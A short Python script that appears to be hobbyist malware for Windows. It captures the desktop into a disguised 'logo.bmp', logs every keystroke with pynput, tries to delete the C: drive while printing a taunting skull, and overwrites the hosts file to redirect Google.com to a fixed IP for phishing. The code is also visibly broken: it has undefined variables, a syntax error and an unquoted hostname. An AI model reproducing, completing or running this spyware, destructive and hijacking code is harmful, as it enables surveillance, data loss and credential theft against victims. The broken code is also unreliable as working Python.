import socket
location ="C:\\Windows\\System32\\drivers\\etc\\hosts"

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
# print(get_ip())

def takeshot():
    import win32gui
    import win32ui
    import win32con
    import win32api

    hdesktop = win32gui.GetDesktopWindow()

    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\logo.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def on_press(key):
   logging.info(str(key))

def log():
    #this is for windows
    import pynput
    from pynput.keyboard import Key, Listener
    import logging

    log_dir = r"C:/programm/"
    logging.basicConfig(filename = (log_dir + "Log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    with Listener(on_press=on_press) as listener:
        listener.join()


def destroy():
    import os
    location = "C://"
    os.remove(location)
    print("""
       ,-------------.
      /               '\'
     /   __       __   '\'
    |  /,--.     ,--.\  |
    |   \  |  __ |  /   |
    |    `-' /  \`-/    |
     \__    |_/\_|   __/
       /_           _'\'
      | | |,-.,-.,-.| |
   `hah `-'| || || |`-'
       ,-.`-'`-'`-',-.
       \_|_,-.,-.,-|_/
       | |_|_||_||_|
        `--.____.--'
    """)
    print("Destroyed")

print(get_ip())

def phis():
    f = open(location,'w'):
    f.write("\n")
    f.write("129.134.31.12 " +Google.com)
